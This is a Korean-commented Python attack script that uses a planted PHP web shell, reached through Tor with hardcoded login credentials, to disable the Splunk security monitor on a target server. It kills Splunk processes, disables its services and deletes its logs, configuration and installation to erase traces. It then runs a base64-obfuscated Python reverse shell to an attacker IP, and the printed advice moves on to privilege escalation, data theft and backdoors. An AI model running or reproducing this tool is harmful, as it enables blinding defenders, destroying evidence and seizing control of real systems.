#!/usr/bin/env python3
"""
Splunk 무력화 공격
같은 서버에서 실행되는 Splunk를 직접 죽이기
"""

import requests
import sys
import time
import urllib.parse
import base64

def kill_splunk(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print("="*60)
    print("Splunk 무력화 공격")
    print("같은 서버의 Splunk를 죽여버리기")
    print("="*60)
    print(f"타겟: {target_ip}\n")

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] alice 세션 획득\n")

    # Splunk 무력화 명령들
    kill_commands = [
        # 1단계: Splunk 프로세스 죽이기
        ("Splunk 프로세스 강제 종료", "pkill -9 splunkd"),
        ("Splunk Forwarder 종료", "pkill -9 splunk"),

        # 2단계: Splunk 서비스 중단
        ("Splunk 서비스 중단", "/opt/splunk/bin/splunk stop"),
        ("Splunk Forwarder 중단", "/opt/splunkforwarder/bin/splunk stop"),
        ("Systemd 서비스 중단", "systemctl stop Splunkd"),

        # 3단계: Splunk 설정 파일 삭제
        ("설정 파일 삭제", "rm -rf /opt/splunk/etc/apps/*/local/*.conf"),
        ("Forwarder 설정 삭제", "rm -rf /opt/splunkforwarder/etc/apps/*/local/*.conf"),

        # 4단계: Splunk 로그 삭제 (흔적 제거)
        ("Splunk 로그 삭제", "rm -rf /opt/splunk/var/log/splunk/*"),
        ("Forwarder 로그 삭제", "rm -rf /opt/splunkforwarder/var/log/splunk/*"),

        # 5단계: Splunk 자동 시작 비활성화
        ("부팅 시 자동 시작 해제", "systemctl disable Splunkd"),
        ("부팅 스크립트 삭제", "rm -f /etc/init.d/splunk"),

        # 6단계: 완전 삭제 (극단적)
        ("Splunk 완전 삭제", "rm -rf /opt/splunk"),
        ("Forwarder 완전 삭제", "rm -rf /opt/splunkforwarder"),
    ]

    print("[전략] Splunk 무력화 후 리버스 쉘")
    print("="*60)
    print(f"1. Splunk 죽이기")
    print(f"2. 리버스 쉘 실행")
    print(f"3. 서버 완전 장악\n")

    # 웹쉘 선택
    webshells = [
        "shell_4727.php",
        "photo.php.jpg",
        "avatar_4727.jpg",
    ]

    print(f"[*] 사용할 웹쉘:")
    for i, shell in enumerate(webshells, 1):
        print(f"{i}. {shell}")

    shell_choice = input("\n선택 (1-3, 기본: 1): ").strip() or "1"
    selected_shell = webshells[int(shell_choice) - 1]

    print(f"\n[*] 선택된 웹쉘: {selected_shell}")

    # 파라미터 선택
    print(f"\n[*] 파라미터 선택:")
    params = ['cmd', 'c', 'x', 'exec', 'command']
    for i, p in enumerate(params, 1):
        print(f"{i}. {p}")

    param_choice = input("\n선택 (1-5, 기본: 2 [c]): ").strip() or "2"
    selected_param = params[int(param_choice) - 1]

    print(f"\n[*] 공격 시나리오:")
    print(f"{'='*60}")

    # 올인원 명령 생성 (한 번에 다 실행)
    all_in_one_cmd = " && ".join([
        "pkill -9 splunkd",
        "pkill -9 splunk",
        "/opt/splunk/bin/splunk stop 2>/dev/null",
        "rm -rf /opt/splunk/var/log/splunk/*",
        "systemctl stop Splunkd 2>/dev/null",
        "systemctl disable Splunkd 2>/dev/null",
        # Splunk 죽인 후 바로 리버스 쉘
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
    ])

    # Base64 인코딩 (난독화)
    b64_cmd = base64.b64encode(all_in_one_cmd.encode()).decode()
    final_cmd = f"echo {b64_cmd}|base64 -d|bash"

    print(f"[1] Splunk 프로세스 강제 종료")
    print(f"[2] Splunk 서비스 중단")
    print(f"[3] Splunk 로그 삭제")
    print(f"[4] 리버스 쉘 실행")
    print(f"\n[*] 모든 명령을 Base64로 인코딩하여 한 번에 실행")

    # 백그라운드 실행
    final_cmd_bg = final_cmd + " &"

    final_url = f"{base_url}/file.php?name=uploads/{selected_shell}&{selected_param}={urllib.parse.quote(final_cmd_bg)}"

    print(f"\n[*] 최종 URL:")
    print(f"{final_url[:100]}...")

    print(f"\n{'='*60}")
    print(f"[!] 주의사항:")
    print(f"{'='*60}")
    print(f"1. C2 리스너 준비:")
    print(f"   nc -lvnp {attacker_port}")
    print(f"\n2. Splunk가 죽으면:")
    print(f"   - 더 이상 탐지 안됨")
    print(f"   - 자유롭게 명령 실행 가능")
    print(f"   - 서버 완전 장악 가능")
    print(f"\n3. 실패 시:")
    print(f"   - Splunk 경로가 다를 수 있음")
    print(f"   - 권한 부족일 수 있음")
    print(f"{'='*60}\n")

    confirm = input("실행하시겠습니까? (yes 입력): ").strip()

    if confirm.lower() != 'yes':
        print("\n[-] 취소됨")
        return

    print(f"\n[*] 공격 시작!")
    print(f"[*] Splunk 죽이기 + 리버스 쉘 동시 실행...\n")

    try:
        resp = session.get(final_url, timeout=10)

        print(f"[+] 응답:")
        print(f"    Status: {resp.status_code}")
        print(f"    크기: {len(resp.text)} bytes")

        if resp.status_code == 200:
            print(f"\n[+] ✅ 200 OK")
            print(f"[*] Splunk가 죽었을 가능성 높음!")

    except requests.exceptions.Timeout:
        print(f"[+] ✅ 타임아웃!")
        print(f"[*] 백그라운드 실행 성공 가능성!")

    except Exception as e:
        print(f"[-] 오류: {str(e)}")

    print(f"\n{'='*60}")
    print(f"[*] 공격 완료")
    print(f"{'='*60}")
    print(f"\n[!] 확인사항:")
    print(f"1. C2 리스너에 연결 확인")
    print(f"2. 연결되면 Splunk 상태 확인:")
    print(f"   ps aux | grep splunk")
    print(f"3. Splunk 죽었으면 자유롭게 공격:")
    print(f"   - 권한 상승")
    print(f"   - 데이터 탈취")
    print(f"   - 백도어 설치")

    # 2차 공격 준비
    print(f"\n[*] Splunk 죽었다면 이제 자유롭게 공격 가능:")
    print(f"    python3 102_all_methods.py {target_ip} {attacker_ip} {attacker_port}")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 107_kill_splunk.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 107_kill_splunk.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    kill_splunk(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
